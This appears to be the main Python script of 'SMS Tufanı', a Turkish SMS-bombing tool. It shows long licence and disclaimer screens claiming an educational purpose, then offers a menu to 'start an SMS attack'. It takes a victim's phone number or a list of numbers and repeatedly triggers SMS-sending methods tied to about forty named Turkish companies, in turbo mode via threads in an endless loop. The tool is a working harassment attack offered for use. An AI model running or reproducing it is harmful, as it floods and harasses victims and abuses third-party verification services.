import time
import os
from colorama import Fore, Style
from time import sleep
from os import system
from sms import SendSms
from concurrent.futures import ThreadPoolExecutor, wait


def slow_print(text, delay=0.008, end='\n'):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print(end, flush=True)  # Yeni satıra geç veya belirtilen end karakterini yaz

def slow_print_more(text, delay=0.03, end='\n'):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print(end, flush=True)  # Yeni satıra geç veya belirtilen end karakterini yaz


def slow_print_more_more(text, delay=0.06, end='\n'):
    for char in text:
        print(char, end='', flush=True)
        sleep(delay)
    print(end, flush=True)  # Yeni satıra geç veya belirtilen end karakterini yaz


servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if attribute.startswith('__') == False:
            servisler_sms.append(attribute)


print(Fore.LIGHTBLUE_EX + """
© 2024 SMS Tufanı. Tüm Hakları Saklıdır.

Bu yazılım "SMS Tufanı" adı altında geliştirilmiş olup, yalnızca eğitim ve siber güvenlik bilincini artırma amaçlı kullanılmak üzere tasarlanmıştır. Yazılımın ticari kullanım, kötüye kullanım veya herhangi bir yasadışı faaliyet için kullanılması yasaktır. Yazılımın kodu, tasarımı ve işleyişi üzerinde tüm haklar geliştiriciye aittir ve bu yazılımın herhangi bir kısmı, izin alınmaksızın kopyalanamaz, dağıtılamaz veya yeniden üretilemez.

Yazılımın kullanımından doğabilecek yasal, teknik veya kişisel sorunlardan tamamen kullanıcı sorumludur ve geliştirici bu gibi durumlarda hiçbir sorumluluk kabul etmez. Yazılımın kullanımı sırasında ya da sonrasında meydana gelebilecek zararlardan geliştirici sorumlu tutulamaz.

Bu yazılımı kullanarak, belirtilen koşulları kabul etmiş sayılırsınız.
""")
time.sleep(2)
if os.name == 'nt':
    os.system('cls')  # Windows için
else:
    os.system('clear')  # Unix tabanlı sistemler için

print(Fore.LIGHTBLUE_EX + """
LİSANS SÖZLEŞMESİ

Bu yazılım, yalnızca eğitim ve öğretim amaçlı olarak geliştirilen "SMS Tufanı" adlı aracı içermektedir. Yazılımın ticari kullanımı, kötüye kullanımı veya herhangi bir yasa dışı faaliyet için kullanılması kesinlikle yasaktır. 

Kullanıcı, bu yazılımı kullanarak sorumluluklarını kabul eder ve yazılımın izin alınmaksızın değiştirilmesi, kopyalanması, çoğaltılması veya dağıtılması yasaktır. 

Bu yazılımın kullanımı esnasında veya sonrasında ortaya çıkabilecek veri kaybı, sistem arızası, yasal sonuçlar ya da üçüncü şahıslara verilen zararlar gibi sorunlardan yazılım geliştiricisi hiçbir şekilde sorumlu tutulamaz.

Bu lisans, yazılımın etik ve yasal sınırlar içinde kullanımını zorunlu kılmakta olup, yazılımı kullanmaya devam eden tüm kullanıcılar bu şartları kabul etmiş sayılır.
""")
time.sleep(2)
if os.name == 'nt':
    os.system('cls')  # Windows için
else:
    os.system('clear')  # Unix tabanlı sistemler için


print(Fore.LIGHTBLUE_EX + """
MIT Lisansı

İşbu belge ile, bu yazılımın bir kopyasına sahip olan herhangi bir kişiye, yazılımın sınırlama olmaksızın kullanımına, kopyalanmasına, değiştirilmesine, birleştirilmesine, yayımlanmasına, dağıtılmasına, alt lisans verilmesine ve/veya yazılımın kopyalarını satmasına, aşağıdaki koşullar altında izin verilmektedir:

© 2024 SMS Tufanı. Tüm Hakları Saklıdır.

Yukarıdaki telif hakkı bildirimi ve bu izin bildirimi, yazılımın tüm kopyalarına veya önemli bölümlerine dahil edilecektir.

YAZILIM "OLDUĞU GİBİ", AÇIK YA DA ZIMNİ HERHANGİ BİR GARANTİ OLMAKSIZIN, PAZARLANABİLİRLİK, BELİRLİ BİR AMACA UYGUNLUK VEYA İHLAL DURUMUNA YÖNELİK GARANTİLER DAHİL, ANCAK BUNLARLA SINIRLI OLMAYAN GARANTİLER OLMADAN SAĞLANMAKTADIR. HİÇBİR DURUMDA YAZARLAR VEYA TELİF HAKKI SAHİPLERİ, YAZILIMDAN KAYNAKLANAN YA DA YAZILIMIN KULLANIMI VEYA DİĞER İŞLEMLERLE İLGİLİ HERHANGİ BİR TALEP, ZARAR VEYA DİĞER YÜKÜMLÜLÜKLERDEN SORUMLU TUTULAMAZ.
""")
time.sleep(2)
if os.name == 'nt':
    os.system('cls')  # Windows için
else:
    os.system('clear')  # Unix tabanlı sistemler için

print(Fore.LIGHTBLUE_EX + """
SON KULLANICI LİSANS SÖZLEŞMESİ (EULA)

Bu yazılımı indirerek, kurarak veya kullanarak, bu Son Kullanıcı Lisans Sözleşmesi’nin (EULA) tüm koşullarını kabul etmiş sayılırsınız. Eğer bu koşulları kabul etmiyorsanız, yazılımı indirmeyin, kurmayın ve kullanmayın.

1. LİSANSIN VERİLMESİ
Bu yazılım, yalnızca kişisel kullanımınız içindir. Yazılımın kopyalanması, değiştirilmesi, dağıtılması, satılması veya ticari olarak kullanılması, yazılı izin olmaksızın yasaktır.

2. KULLANIM KOŞULLARI
Yazılımı sadece yasal amaçlar doğrultusunda kullanabilirsiniz. Yazılımın herhangi bir yasa dışı faaliyet, siber saldırı, spam gönderme veya zarar verme amacıyla kullanılması kesinlikle yasaktır. Kullanıcı, yazılımı bu koşullara uygun şekilde kullanmayı kabul eder.

3. GÜNCELLEMELER VE DESTEK
Geliştirici, yazılımın herhangi bir güncellemesini veya desteğini sağlama yükümlülüğünde değildir. Güncellemeler sağlanırsa, bu EULA’nın şartlarına tabi olacaktır.
""")
time.sleep(2)
if os.name == 'nt':
    os.system('cls')  # Windows için
else:
    os.system('clear')  # Unix tabanlı sistemler için

    
print(Fore.LIGHTBLUE_EX + """
4. SORUMLULUK REDDİ VE SINIRLAMALAR
Yazılım "OLDUĞU GİBİ" sağlanmaktadır. Geliştirici, yazılımın hatasız çalışacağına, ihtiyaçlarınıza uygun olduğuna veya herhangi bir teknik sorun yaratmayacağına dair hiçbir garanti vermez. Yazılımın kullanımı sırasında veya sonrasında meydana gelebilecek herhangi bir veri kaybı, sistem arızası veya yasal sorundan geliştirici sorumlu tutulamaz.

5. YASAL SORUMLULUK
Yazılımı kullanarak, bu yazılımın kötüye kullanılmasından, yasa dışı faaliyetlerde kullanılmasından veya üçüncü şahıslara zarar vermesinden doğacak tüm yasal sonuçlardan tamamen siz sorumlusunuz. Geliştirici, bu tür durumlarda hiçbir sorumluluk kabul etmez.

6. FESİH
Geliştirici, bu EULA’nın ihlal edilmesi durumunda yazılım kullanım hakkınızı sona erdirme yetkisine sahiptir. Fesih halinde, yazılımı kullanmayı derhal durdurmalı ve tüm kopyalarını silmelisiniz.

Bu EULA, yazılımı kullanmaya başladığınız andan itibaren geçerli olup, yazılımın kullanımına yönelik tüm yasal sınırları belirler.
""")
time.sleep(2)
if os.name == 'nt':
    os.system('cls')  # Windows için
else:
    os.system('clear')  # Unix tabanlı sistemler için







print(Fore.LIGHTBLUE_EX + """
FERAGATNAME (DISCLAIMER)

Bu yazılım, yalnızca eğitim ve siber güvenlik bilincini artırma amaçlı geliştirilmiştir. Yazılımın yasa dışı, zarar verici veya herhangi bir kötü amaçla kullanılması kesinlikle yasaktır. Kullanıcılar, bu yazılımı kullanırken tüm yasal sorumluluğu üstlenir ve yazılımın kötüye kullanımı durumunda yasal sonuçlardan tamamen kullanıcı sorumludur.

Geliştirici, bu yazılımın yanlış veya kötü niyetli kullanımı nedeniyle oluşabilecek herhangi bir zarardan sorumlu tutulamaz. Yazılım "OLDUĞU GİBİ" sağlanmaktadır ve geliştirici, yazılımın herhangi bir hatasız çalışması, güvenliği veya herhangi bir amaca uygunluğu konusunda garanti vermez. Yazılımın kullanımından kaynaklanabilecek veri kaybı, sistem arızası veya diğer teknik sorunlar için geliştirici sorumluluk kabul etmez.

Bu yazılımı kullanarak, belirtilen tüm koşulları kabul etmiş sayılırsınız ve yazılımın kullanımından doğabilecek tüm riskleri ve sorumluluğu üstlenirsiniz.

""")
time.sleep(3)
if os.name == 'nt':
    os.system('cls')  # Windows için
else:
    os.system('clear')  # Unix tabanlı sistemler için

print(Fore.LIGHTBLUE_EX + """
UYARI\n

Bu yazılım yalnızca eğitim amaçlı olarak geliştirilmiştir ve kullanıcıların bu aracı kötüye kullanması veya herhangi bir kişi, kurum ya da kuruluşa zarar verme amacıyla kullanması kesinlikle yasaktır. Yazılımın amacı, siber güvenlik konusunda farkındalık oluşturmak ve eğitimsel amaçlara hizmet etmektir. Bu aracın kötüye kullanımı sonucu ortaya çıkabilecek herhangi bir hukuki, maddi, manevi veya teknik sorunun tamamıyla kullanıcının kendi sorumluluğunda olduğunu ve geliştirici olarak, bu yazılımın kullanımı sırasında veya sonrasında meydana gelebilecek herhangi bir veri kaybı, sistem arızası, hukuki yaptırım, kişisel zarar ya da üçüncü şahıslara verilebilecek her türlü zarardan sorumluluk kabul etmediğimi beyan ederim. Yazılımın amacı dışında kullanımı, yürürlükteki yasa ve yönetmeliklere aykırıdır ve kullanıcı, bu sorumlulukları ihlal etmesi durumunda her türlü hukuki ve cezai yaptırıma tabi olduğunu kabul eder.
Bu kodda kullanılan markaları kodu inceleyerek görebilirsiniz. (Satır 206-246)
""")
time.sleep(10)
if os.name == 'nt':
    os.system('cls')  # Windows için
else:
    os.system('clear')  # Unix tabanlı sistemler için



while 1:
    system("cls||clear")
    slow_print(f"""{Fore.LIGHTCYAN_EX}
      ______   __       __   ______   ________  __    __  ________  ______   __    __  ______ 
     /      \\ /  \\     /  | /      \\ /        |/  |  /  |/        |/      \\ /  \\  /  |/      |
    /$$$$$$  |$$  \\   /$$ |/$$$$$$  |$$$$$$$$/ $$ |  $$ |$$$$$$$$//$$$$$$  |$$  \\ $$ |$$$$$$/ 
    $$ \\__$$/ $$$  \\ /$$$ |$$ \\__$$/    $$ |   $$ |  $$ |$$ |__   $$ |__$$ |$$$  \\$$ |  $$ |  
    $$      \\ $$$$  /$$$$ |$$      \\    $$ |   $$ |  $$ |$$    |  $$    $$ |$$$$  $$ |  $$ |  
     $$$$$$  |$$ $$ $$/$$ | $$$$$$  |   $$ |   $$ |  $$ |$$$$$/   $$$$$$$$ |$$ $$ $$ |  $$ |  
    /  \\__$$ |$$ |$$$/ $$ |/  \\__$$ |   $$ |   $$ \\__$$ |$$ |     $$ |  $$ |$$ |$$$$ | _$$ |_ 
    $$    $$/ $$ | $/  $$ |$$    $$/    $$ |   $$    $$/ $$ |     $$ |  $$ |$$ | $$$ |/ $$   |
     $$$$$$/  $$/      $$/  $$$$$$/     $$/     $$$$$$/  $$/      $$/   $$/ $$/   $$/ $$$$$$/ 
                                                                                           {Style.RESET_ALL}{Fore.LIGHTRED_EX}tiktok.com/@unknown_napim\n
   """)





    try:
        menu = (input(Fore.LIGHTRED_EX + " 1- SMS Saldırısı Başlat (Normal, Yavaş)\n\n 2- SMS Saldırısı Başlat (Turbo, Aşırı Hızlı)\n\n 3- Çıkış\n\n" + Fore.LIGHTYELLOW_EX + " Seçim: "))
        if menu == "":
            continue
        menu = int(menu)
    except ValueError:
        system("cls||clear")
        slow_print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
        sleep(3)
        continue
    if menu == 1:
        system("cls||clear")
        slow_print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız (Birden çoksa 'enter' tuşuna basınız): ", end="")
        tel_no = input()
        tel_liste = []
        if tel_no == "":
            system("cls||clear")
            slow_print(Fore.LIGHTYELLOW_EX + "Telefon numaralarının kayıtlı olduğu dosyanın dizinini yazınız: ", end="")
            dizin = input()
            try:
                with open(dizin, "r", encoding="utf-8") as f:
                    for i in f.read().strip().split("\n"):
                        if len(i) == 10:
                            tel_liste.append(i)
                sonsuz = ""
            except FileNotFoundError:
                system("cls||clear")
                slow_print(Fore.LIGHTRED_EX + "Hatalı dosya dizini. Tekrar deneyiniz.")
                sleep(3)
                continue
        else:
            try:
                int(tel_no)
                if len(tel_no) != 10:
                    raise ValueError
                tel_liste.append(tel_no)
                sonsuz = "(Sonsuz ise 'enter' tuşuna basınız)"  
            except ValueError:
                system("cls||clear")
                slow_print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
                sleep(3)
                continue
        system("cls||clear")
        try:
            slow_print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): ", end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            slow_print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            slow_print(Fore.LIGHTYELLOW_EX + f"Kaç adet SMS göndermek istiyorsun {sonsuz}: ", end="")
            kere = input()
            if kere:
                kere = int(kere)
            else:
                kere = None
        except ValueError:
            system("cls||clear")
            slow_print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            slow_print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla göndermek istiyorsun: ", end="")
            aralik = int(input())
        except ValueError:
            system("cls||clear")
            slow_print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        if kere is None: 
            sms = SendSms(tel_no, mail)
            while True:
                for attribute in dir(SendSms):
                    attribute_value = getattr(SendSms, attribute)
                    if callable(attribute_value):
                        if attribute.startswith('__') == False:
                            exec("sms." + attribute + "()")
                            sleep(aralik)
        for i in tel_liste:
            sms = SendSms(i, mail)
            if isinstance(kere, int):
                while sms.adet < kere:
                    for attribute in dir(SendSms):
                        attribute_value = getattr(SendSms, attribute)
                        if callable(attribute_value):
                            if attribute.startswith('__') == False:
                                if sms.adet == kere:
                                    break
                                exec("sms." + attribute + "()")
                                sleep(aralik)
        print(Fore.LIGHTGREEN_EX + "\nBaşarılı. Menüyü görmek için 'enter' tuşuna basın.")
        input()
    elif menu == 3:
        system("cls||clear")
        slow_print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break
    elif menu == 2:
        system("cls||clear")
        slow_print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız: ", end="")
        tel_no = input()
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            system("cls||clear")
            slow_print(Fore.LIGHTRED_EX + "Hatalı telefon numarası. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        try:
            slow_print(Fore.LIGHTYELLOW_EX + "Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): ", end="")
            mail = input()
            if ("@" not in mail or ".com" not in mail) and mail != "":
                raise
        except:
            system("cls||clear")
            slow_print(Fore.LIGHTRED_EX + "Hatalı mail adresi. Tekrar deneyiniz.") 
            sleep(3)
            continue
        system("cls||clear")
        send_sms = SendSms(tel_no, mail)
        try:
            while True:
                with ThreadPoolExecutor() as executor:
                    futures = [
                        executor.submit(send_sms.Akasya),
                        executor.submit(send_sms.Akbati),
                        executor.submit(send_sms.Ayyildiz),
                        executor.submit(send_sms.Baydoner),
                        executor.submit(send_sms.Beefull),
                        executor.submit(send_sms.Bim),
                        executor.submit(send_sms.Bisu),
                        executor.submit(send_sms.Bodrum),
                        executor.submit(send_sms.Clickme),
                        executor.submit(send_sms.Dominos),
                        executor.submit(send_sms.Englishhome),
                        executor.submit(send_sms.Evidea),
                        executor.submit(send_sms.File),
                        executor.submit(send_sms.Frink),
                        executor.submit(send_sms.Happy),
                        executor.submit(send_sms.Hayatsu),
                        executor.submit(send_sms.Hey),
                        executor.submit(send_sms.Hizliecza),
                        executor.submit(send_sms.Icq),
                        executor.submit(send_sms.Istegelecek),
                        executor.submit(send_sms.Jojow),
                        executor.submit(send_sms.Karsiyaka),
                        executor.submit(send_sms.Konfor),
                        executor.submit(send_sms.Kozmos),
                        executor.submit(send_sms.Koton),
                        executor.submit(send_sms.Limon),
                        executor.submit(send_sms.Mg),
                        executor.submit(send_sms.Migros),
                        executor.submit(send_sms.Momo),
                        executor.submit(send_sms.More),
                        executor.submit(send_sms.N11),
                        executor.submit(send_sms.PizzaHut),
                        executor.submit(send_sms.Rafik),
                        executor.submit(send_sms.Ramstore),
                        executor.submit(send_sms.Simferpol),
                        executor.submit(send_sms.Slipknot),
                        executor.submit(send_sms.Turkcell),
                        executor.submit(send_sms.Uyku),
                        executor.submit(send_sms.Vivense),
                    ]
                    wait(futures)
                sleep(5)  
        except KeyboardInterrupt:
            system("cls||clear")
            print(Fore.LIGHTRED_EX + "SMS Gönderim durduruldu.") 
            sleep(3)
            continue

        print(Fore.LIGHTGREEN_EX + "\nBaşarılı. Menüyü görmek için 'enter' tuşuna basın.")
        input()
